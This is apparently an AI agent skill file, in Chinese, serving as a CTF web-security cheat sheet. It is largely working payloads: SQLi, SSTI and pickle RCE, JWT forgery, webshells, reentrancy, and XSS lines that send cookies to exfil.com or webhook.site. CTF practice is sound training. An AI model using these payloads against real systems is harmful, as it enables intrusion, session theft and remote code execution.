---
name: web
description: CTF Web安全解题全能助手 — 覆盖SQL注入（二次注入/关键字拆分/WAF绕过/procedure analyse/Host Header注入等30+技巧）、服务端注入（SSTI多种引擎/SSRF Host Header+DNS Rebinding/PHP类型戏法/LFI php://filter/XXE/命令注入/XPath注入）、认证与访问控制（JWT全谱攻击/OAuth+SAML/会话攻击/OIDC）、反序列化（Java ysoserial/Python Pickle/.NET JSON/PHP SoapClient）、客户端攻击（XSS/DOMPurify绕过/CSPT/缓存投毒/CSRF/HTTP请求走私/AngularJS沙箱逃逸）、Node.js原型污染+VM逃逸、代码执行（Ruby/Perl/LaTeX/JS/PHP preg_replace/文件上传RCE）、Web3区块链（EIP-1967/Reentrancy/Groth16/Delegatecall/ABI编码）、CVE漏洞（Apache/React RSC/HAProxy）、GraphQL CSRF/XS-Leak等20个子领域。
---

# CTF Web Security — Web安全解题指南

你是 CTF Web 类题目的顶级解题专家。你的知识库覆盖以下所有子领域，按需深入：

## 一、前置准备

```bash
pip install requests flask-unsign jwt pycryptodome

# 工具
apt install sqlmap dirb gobuster burpsuite
# ysoserial — https://github.com/frohoff/ysoserial (Java反序列化)
# RsaCtfTool — https://github.com/RsaCtfTool/RsaCtfTool
# Foundry/cast — Web3链上交互: curl -L https://foundry.paradigm.xyz | bash
```

---

## 二、解题总流程

### 第0步：快速侦察

```bash
curl -sI https://target | head -20     # 响应头
curl -s https://target/robots.txt      # 爬虫规则
curl -s https://target/.git/HEAD       # Git泄露
gobuster dir -u https://target -w wordlist.txt  # 目录爆破
```

### 第1步：攻击面分类

| 特征 | 攻击方向 |
|------|----------|
| 登录/注册/密码重置 | 认证绕过 + JWT + SQLi |
| 搜索/过滤/表单 | SQLi + SSTI + XXE |
| 文件上传 | 文件上传RCE |
| API端点 (JSON/GraphQL) | 反序列化 + 原型污染 + CSRF |
| Cookie/Token/Session | JWT攻击 + 会话劫持 |
| URL参数/路径 | SSRF + LFI + 路径穿越 |
| 区块链/Web3 | 智能合约漏洞 + 重入 + proxy |
| 管理Bot/headless浏览器 | XSS + CSRF + XS-Leak |

---

## 三、SQL注入

详见 [sql-injection.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\sql-injection.md)

### 快速分类与决策

```sql
-- 基本测试
' OR '1'='1
' OR 1=1--
admin'--
' UNION SELECT 1,2,3--

-- 注释符
--    (MySQL/SQLite)
#     (MySQL)
/**/  (多行注释)
```

### 反斜杠转义引号绕过

```bash
# username=\ 使第一个引号被转义 → 密码的首引号匹配username的尾引号
curl -X POST target/login -d 'username=\&password= OR 1=1-- '
curl -X POST target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

### 十六进制编码绕过引号过滤

```sql
SELECT 0x6d656f77;  -- 返回 'meow'（无需引号）
username=asd\&password=) union select 1, 0x7b7b73656c662e...#
```

### 二次注入

模式：注册 → 存储 → 再次查询时触发。注入点在用户名等字段中，首次 INSERT 安全，但检索后不安全地用于新查询。

### LIKE 逐字符爆破

```python
password = ""
for pos in range(length):
    for c in string.printable:
        if oracle(f"' OR password LIKE '{password}{c}%' --"):
            password += c
            break
```

### WAF 绕过技术表

| 技术 | 说明 |
|------|------|
| 关键字双写 | `SELESELECTCT` → 过滤后剩下 `SELECT` |
| XML实体编码 | `&#85;&#78;&#73;&#79;&#78;` = `UNION` |
| PCRE回溯限制 | 100万字符使PHP正则超时→跳过WAF |
| 内联注释 | `SELECT/**/flag` |
| Shift-JIS编码 | 多字节字符含`'`字节，绕过转义 |
| BETWEEN绕过 | `BETWEEN 'a' AND 'z'` 替代 `=` |
| `PROCEDURE ANALYSE()` | MySQL特有→Host Header注入 |
| MySQL session变量 | `@a:=payload` 双值注入 |
| DNS外带 | `LOAD_FILE(concat('\\\\',query,'.attacker.com\\'))` |
| processlist竞态 | `information_schema.processlist`泄露过路查询 |
| innodb_table_stats | `information_schema` 被禁时的替代数据源 |

### SQLi 地址速查

| 数据库 | 信息Schema | 字符串拼接 | 限制行数 |
|--------|------------|-----------|---------|
| MySQL | `information_schema.tables` | `CONCAT()` | `LIMIT 1` |
| PostgreSQL | `information_schema.tables` | `\|\|` | `LIMIT 1` |
| SQLite | `sqlite_master` | `\|\|` | `LIMIT 1` |
| MSSQL | `sys.tables` | `+` | `TOP 1` |

### INSERT ON DUPLICATE KEY UPDATE 密码覆写

注册已存在的用户名触发 `ON DUPLICATE KEY UPDATE` → `password=attacker_controlled`。

---

## 四、服务端注入

详见 [server-side.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side.md)、[server-side-2.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side-2.md)、[server-side-exec.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side-exec.md)

### SSTI — 服务端模板注入

| 引擎 | 探测 | RCE Payload |
|------|------|------------|
| **Jinja2** (Python) | `{{7*7}}` → `49` | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| **Mako** (Python) | `${7*7}` | `${__import__('os').popen('id').read()}` |
| **Twig** (PHP) | `{{7*7}}` → `49` | `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` |
| **Go Template** | `{{.}}` | `{{.}}` 有限→找暴露的函数 |
| **EJS** (Node.js) | `<%= 7*7 %>` | `<%= require('child_process').execSync('id') %>` |
| **ERB** (Ruby) | `<%= 7*7 %>` | `<%= system('id') %>` |
| **Vue.js** (服务端) | 对象原型链 | `toString.constructor.constructor('return this.process.mainModule.require("child_process").execSync("id").toString()')()` |
| **Thymeleaf/SpEL** (Java) | `${7*7}` | `${T(java.lang.Runtime).getRuntime().exec('id')}` |
| **Smarty** (PHP) | `{7*7}` | CVE-2017-1000480 注释注入 |

### SSTI 引号过滤绕过

```python
# 无引号字符串构造: 用 __dict__ 获取已存在的字符串 key
{{self.__init__.__globals__.__builtins__.__import__(request.args.os).popen(request.args.cmd).read()}}
# ?os=os&cmd=id
```

### PHP 类型戏法 (Type Juggling)

**松比较 (`==`) 绕过速查 (全部为 true)：**

| 比较 | 原因 |
|------|------|
| `0 == "php"` | 非数字字符串转 `0` |
| `"0e123" == "0e456"` | 科学计数法，都解析为 `0` |
| `NULL == false` | 都是假值 |
| `NULL == ""` | 都是假值 |
| `strcmp(array, str)` → NULL == 0 | strcmp 返回 NULL |

**MD5 魔法哈希：** `md5("240610708") = "0e462097..."` vs `md5("QNKCDZO") = "0e830400..."` → 都以 `0e` 开头 → `==` 比较为真。

**利用：**
```bash
# JSON Content-Type → 发送整数 0
curl -X POST target/login -H 'Content-Type: application/json' -d '{"password": 0}'
# PHP: 0 == "any_string" → true

# 数组绕过 strcmp
curl target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → !strcmp() 通过
```

### PHP LFI / php://filter

```bash
# 源码泄露（base64 防止执行）
curl "target/?page=php://filter/convert.base64-encode/resource=index"
echo "PD9waHAg..." | base64 -d

# /dev/fd 绕过——某些 PHP 版本中 LFI 可以用 /dev/fd/N
# zip:// wrapper — 上传ZIP含PHP文件，include zip://upload.zip#shell
```

### SSRF

```bash
# Host Header 注入
curl -H "Host: 169.254.169.254" https://target

# DNS Rebinding → TOCTOU
# 第一次DNS解析: 合法IP → 通过检查
# 第二次DNS解析: 127.0.0.1 → 实际连接内网

# 未转义点号正则白名单绕过
curl "http://target?url=http://evil.com#.target.com"  # 正则: .*\.target\.com
```

### XXE (XML External Entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>&xxe;</root>
```

**DOCX/Office XML 上传 → XXE：** Office 文档本质是 XML → 修改内部 XML 注入 XXE。

### 命令注入

```bash
; id
| id
`id`
$(id)
\nid        # 换行分隔
%0aid       # URL编码换行
```

---

## 五、认证与访问控制

详见 [auth-jwt.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\auth-jwt.md)、[auth-and-access.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\auth-and-access.md)、[auth-infra.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\auth-infra.md)

### JWT 攻击战术

| 攻击 | 方法 |
|------|------|
| **None 算法** | `{"alg":"none"}` → 删签名，payload 任意改 |
| **算法混淆 RS256→HS256** | 用公钥（公开）作为 HMAC 密钥签名 → 公钥已知 |
| **弱密钥爆破** | `flask-unsign --decode` / `hashcat -m 16500 jwt.txt` |
| **未验证签名** | 服务端用 `decode()` 而非 `verify()` → 直接改 payload，签名不变 |
| **JWK 头注入** | 在 header 嵌入自签 RSA 公钥 → 自签 token |
| **JKU 头注入** | JKU URL 指向 attacker 的 JWKS → 用 attacker 私钥签名 |
| **KID 路径穿越** | `"kid": "../../../../../dev/null"` → 空密钥 |
| **JWE 公钥伪造** | 公钥暴露时，用其加密任意 payload |

```python
# 算法混淆 (RS256→HS256)
import jwt
public_key = open('public.pem').read()
token = jwt.sign({'username': 'admin'}, public_key, algorithm='HS256')

# JWK 头注入
import jwt, base64
from cryptography.hazmat.primitives.asymmetric import rsa
private_key = rsa.generate_private_key(65537, 2048)
pub = private_key.public_key().public_numbers()
jwk = {"kty": "RSA", "e": base64.urlsafe_b64encode(pub.e.to_bytes(3, 'big')).decode(),
       "n": base64.urlsafe_b64encode(pub.n.to_bytes(256, 'big')).decode()}
forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
```

---

## 六、反序列化攻击

详见 [server-side-deser.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side-deser.md)

### Java 反序列化 (ysoserial)

**检测：** `ObjectInputStream.readObject()` / Base64 以 `rO0AB` 开头 / Hex 以 `aced0005` 开头

```bash
java -jar ysoserial.jar CommonsCollections1 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar URLDNS 'http://attacker.oastify.com'  # 盲检测DNS回调

# gadget chain 顺序: CommonsCollections1-7 → CommonsBeanutils1 → Spring1/2
# Java 17+: Jackson/Fastjson 反序列化替代
```

### Python Pickle 反序列化

```python
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
```

**检测：** `pickle.loads()` / Flask session cookie / ML `.pkl` 文件 / Base64 含 `\x80\x04\x95`

### PHP 反序列化

- `unserialize()` → 控制对象属性 → 触发 `__wakeup()`/`__destruct()` 魔术方法
- `SoapClient` CRLF SSRF：在序列化数据中通过 `SoapClient.__call()` → `_user_agent` 注入 CRLF → SSRF

### .NET JSON TypeNameHandling

```json
{"$type": "System.IO.FileInfo, System.IO.FileSystem", "fileName": "/etc/passwd"}
```

---

## 七、客户端攻击

详见 [client-side.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\client-side.md)、[client-side-advanced.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\client-side-advanced.md)

### XSS Payload 速查

```html
<!-- 基础 -->
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
<svg/onload=fetch('https://exfil.com/?c='+document.cookie)>
<body onload=alert(1)>

<!-- 过滤绕过 -->
<ScRiPt>alert(1)</ScRiPt>         <!-- 大小写混合 -->
<script>alert`1`</script>         <!-- 模板字面量 -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML实体 -->
<svg/onload=alert(1)>             <!-- 无空格 -->

<!-- DOMPurify绕过 → 直接POST到 /api/autosave -->
```

### 常见攻击模式

| 模式 | 方法 |
|------|------|
| **CSPT** (Client-Side Path Traversal) | `?id=../admin/addAdmin` → 前端 fetch 路径被篡改 |
| **缓存投毒** | `X-Forwarded-Host: attacker.com` → CDN缓存含恶意JS的响应 |
| **DOM Clobbering** | `<img name=cookie>` → `document.cookie` 被替换 |
| **HTTP请求走私** | CL.TE / TE.CL 不一致 → 前端/后端解析分歧 |
| **JPEG+HTML Polyglot** | 文件既是合法JPEG又含HTML → Content-Type绕过后执行JS |
| **XS-Leak** | 图片加载时间差 → 逐字符泄露（`<img src=/?q=flag{X}>`，加载成功/失败时间不同） |
| **GraphQL CSRF** | GET方法 + `Content-Type: text/plain` → 绕过CSRF保护 |
| **CSV注入** | 导出CSV → 单元格公式 `=cmd|' /C notepad'!A0` |
| **AngularJS沙箱逃逸** | `charAt`/`trim` 覆写 + `constructor.constructor` 链 |

### 管理Bot利用

```html
<!-- 窃取bot的session/cookie -->
<script>fetch('https://webhook.site/xxx?c='+encodeURIComponent(document.cookie))</script>

<!-- CSP绕过 + meta refresh重定向 -->
<meta http-equiv="refresh" content="0;url=javascript:fetch(...)">
```

---

## 八、Node.js 原型污染与 VM 逃逸

详见 [node-and-prototype.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\node-and-prototype.md)

### 原型污染基础

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"a.__proto__.isAdmin": true}
```

### 受影响的库

`flatnest` (CVE-2023-26135)、`lodash.merge`(旧版)、`deep-extend`、`qs`(旧版)、`merge`

### flatnest 圆形引用绕过 (CVE-2023-26135)

`insert()` 阻止 `__proto__`/`constructor`，但 `seek()`（解析 `[Circular (path)]` 值）没有：
```json
{"x": "[Circular (constructor.prototype)]", "x.settings.enableJavaScriptEvaluation": true}
```

### VM 沙箱逃逸

```javascript
// 经典 CommonJS 逃逸
this.constructor.constructor('return this.process.mainModule.require("child_process").execSync("id").toString()')()

// ESM 兼容逃逸 (CVE-2025-61927)
const sandbox = Object.create(null);
```

### 完整攻击链：原型污染 → VM逃逸 → RCE

1. 原型污染注入 `settings.enableJavaScriptEvaluation = true`
2. Happy-DOM 读取 `options.settings` → 回退到被污染的 `Object.prototype`
3. VM 允许 JS 执行 → 沙箱逃逸 → `execSync`

---

## 九、代码执行

详见 [server-side-exec.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side-exec.md)、[server-side-exec-2.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side-exec-2.md)

### 多语言代码注入速查

| 语言 | 注入点 | Payload |
|------|--------|---------|
| **Ruby** | `instance_eval` | `valid');system('id')#` |
| **Ruby** (关键字过滤) | 绕过 `File`/`system` | `open('\|id')` / `Process.spawn('id')` |
| **Ruby** (ObjectSpace) | 堆扫描 | `ObjectSpace.each_object(String){\|x\| x[0]=="T" and print x}` |
| **Perl** | `open()` 双参数 | `open(my $f, "\|id")` 或 `open(my $f, "id\|")` |
| **PHP** | `preg_replace /e` | `/e` 修饰符执行替换结果作为 PHP 代码 |
| **PHP** | `assert()` | `assert("system('id')")` — 字符串参数被 eval |
| **PHP** | 反引号 (字符限制) | `` `$_GET[1]` `` + `?1=cat /f*` |
| **JS** (服务端) | `eval` 黑名单绕过 | Unicode 同形字、编码变换 |
| **Python** | `str.format()` 属性遍历 | `{user.__init__.__globals__[CONFIG]}` |
| **Prolog** | 注入 | `');system('id').` |
| **LaTeX** | RCE | 未过滤的 `\input`/`\write18` |
| **PHP** | `extract()` | `?var=value` → register_globals 式覆盖 |

### 文件上传 RCE

| 技术 | 方法 |
|------|------|
| `.htaccess` 上传 | `AddType application/x-httpd-php .jpg` → JPG 当 PHP 执行 |
| PHP Log Poisoning | LFI → 先注入 `<?php system($_GET['c']);?>` 到UA/Referer → 日志文件包含 |
| PNG/PHP Polyglot | 文件既是合法PNG又是PHP代码 |
| ZipSlip | 路径穿越ZIP解压 → `../shell.php` |
| BMP像素 Webshell | 文件头是合法BMP → PHP解析像素为代码 |

### ReDoS 侧信道

正则表达式回溯爆炸 → 匹配时间差异 → 逐字符爆破。

---

## 十、Web3 / 区块链

详见 [web3.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\web3.md)

### 密钥认证

```python
from eth_account import Account
from eth_account.messages import encode_defunct

acct = Account.from_key(PRIVATE_KEY)
nonce = s.get(f'{BASE}/api/auth/nonce').json()['nonce']
msg = encode_defunct(text=nonce)
sig = acct.sign_message(msg)
s.post(f'{BASE}/api/auth/login', json={'signedNonce': '0x'+sig.signature.hex(), 'nonce': nonce})
```

### Foundry 命令

```bash
cast storage $PROXY 0x360894a13ba1...  # EIP-1967 implementation slot
cast call $CONTRACT "func(args)" --rpc-url $RPC
cast send $CONTRACT "func(args)" --private-key $KEY --rpc-url $RPC --broadcast
forge create src/Exploit.sol:Exploit --private-key $KEY --rpc-url $RPC --broadcast
```

### 智能合约漏洞速查

| 漏洞 | 识别 | 利用 |
|------|------|------|
| **重入攻击 (DAO)** | `balance` 更新在 `call` 之后 | fallback/receive → 递归 `withdraw()` |
| **Delegatecall 存储滥用** | `delegatecall` 到不可信合约 | 注入合约修改 proxy 存储 slot |
| **EIP-1967 Proxy** | Proxy + Implementation 分离 | 升级实现合约或存储碰撞 |
| **Groth16 伪造证明** | 可信设置参数泄露 (delta==gamma) | 用已知 toxic waste 伪造证明 |
| **Transient Storage 碰撞** | Solidity 0.8.28-0.8.33 `tstore` | 清理辅助碰撞 → 残留值 |
| **Phantom Market** | canResolve=true 但无funds | force-fund → 控制resolution |
| **ABI Coder v1 vs v2** | `pragma abicoder v1` | dirty address 绕过v2验证 |

### 重入攻击模板

```solidity
contract Exploit {
    function attack() external payable {
        target.withdraw();  // 触发 receive() 递归
    }
    receive() external payable {
        if (address(target).balance > 0) target.withdraw();
    }
}
```

---

## 十一、CVE 漏洞

详见 [cves.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\cves.md)

| CVE | 类型 |
|-----|------|
| CVE-2012-0053 | Apache HttpOnly Cookie 泄露 |
| CVE-2025-55182 | React Server Components Flight RCE |
| CVE-2023-26135 | flatnest 原型污染 |
| CVE-2025-61927 | Node.js VM ESM 沙箱逃逸 |
| CVE-2025-8110 | Gogs Symlink RCE |
| CVE-2017-1000480 | Smarty SSTI 注释注入 |

---

## 十二、高级技巧

详见 [server-side-advanced.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-web\server-side-advanced.md) ×4

### 路径穿越高级绕过

| 技术 | 方法 |
|------|------|
| 递归替换绕过 | `....//....//flag` → 替换 `../` 为空白后变成 `../../flag` |
| PHP (int)截断 | `(int)"0123/../../flag"` → 123 `/` 之后被丢弃 |
| Unicode同形字 | U+2E2E (`⸮`) 在某些渲染器中等同于 `.` |
| 空字节 `%00` | PHP < 5.3.4 截断文件路径 |
| Double URL编码 | `%252e%252e%252f` → 两次解码变成 `../` |

### Unicode Case Folding XSS

`U+017F` (long-s `ſ`) → 大写转 `S`。`ſcript` 大写后为 `SCRIPT`，匹配 `<SCRIPT>` 标签。

### HAProxy 绕过

`GET /flag HTTP/1.1` vs `GET /protected HTTP/1.1\nGET /flag HTTP/1.1` → HAProxy 看第一个请求，后端看第二个。

### 竞争条件 (Race Condition)

```bash
# 并行多次发送，在 TOCTOU 窗口内执行操作
for i in {1..20}; do curl -X POST target/apply -d 'code=PROMO99' & done
```

### 缓存投毒 — X-Forwarded-Host

CDN 缓存 key 不含 request header → 注入 `X-Forwarded-Host: evil.com` → 响应中的 `<script src="https://{{host}}/app.js">` 指向攻击者服务器 → 缓存 120s → 所有用户中招。

---

## 十三、GraphQL 攻击

### 内省查询

```graphql
{ __schema { types { name fields { name } } } }
```

### CSRF + GraphQL

GET请求 + `Content-Type: text/plain` → 绕过 CORS preflight → 跨源发送 mutation。

### 深度/数量限制绕过

```graphql
# 片段递归爆炸
query { ...A } fragment A on Type { a1 ...A a2 ...A }
```

---

## 十四、关键决策：何时切换 Skill

| 题目特征 | 应切换至 |
|----------|----------|
| Web应用只是入口，漏洞在二进制服务 | `/ctf-pwn` |
| 客户端脚本/WebAssembly 需逆向 | `/ctf-reverse` |
| 主要是加密/密码学协议 | `/ctf-crypto` |
| 纯取证/日志分析/PCAP恢复 | `/ctf-forensics` |
| 编码谜题/限于浏览器外的线索 | `/ctf-misc` |
| 社交工程/域名/WHOIS | `/ctf-osint` |

---

## 十五、自动化工作流

1. **快速侦察** → `curl -sI` / `robots.txt` / `.git` / `gobuster` / Burp Suite 爬虫
2. **攻击面映射** → 识别所有表单/API/上传/cookie/WebSocket
3. **分类攻击** → SQLi/SSTI/SSRF/XXE/LFI → 从最简单的 payload 试起
4. **认证分析** → JWT解析 → 尝试 none/混淆/弱密钥/JWK
5. **反序列化** → 找 Base64/Hex 特征 → ysoserial/Pickle/SoapClient
6. **客户端利用** → XSS + CSRF + CORS → 管理Bot利用
7. **深度分析** → 原型污染链 / 缓存投毒 / HTTP走私 / Web3 合约
8. **查阅参考** → 遇到具体模式时打开对应 `.md` 参考文件获取完整 payload

> **Web 安全核心心态：Web 是最高层的攻击面。永远从最简单的 payload 开始（`admin'--`→`{{7*7}}`→`` `id` ``），逐步深入。每个输入点都是一个潜在的漏洞——URL、Header、Cookie、POST Body、WebSocket、文件上传、metadata。不要忽略任何一个。**
